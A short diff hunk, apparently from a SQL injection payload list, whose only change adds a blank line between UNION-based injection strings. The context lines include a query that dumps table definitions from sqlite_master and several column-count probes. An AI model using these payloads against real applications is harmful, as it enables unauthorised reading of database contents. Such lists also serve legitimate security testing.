@@ -82,6 +82,7 @@
 
 ' UNION SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' --
 .....................................................................................................................
+
 ' UNION SELECT NULL --
 
 ' UNION SELECT 1 --
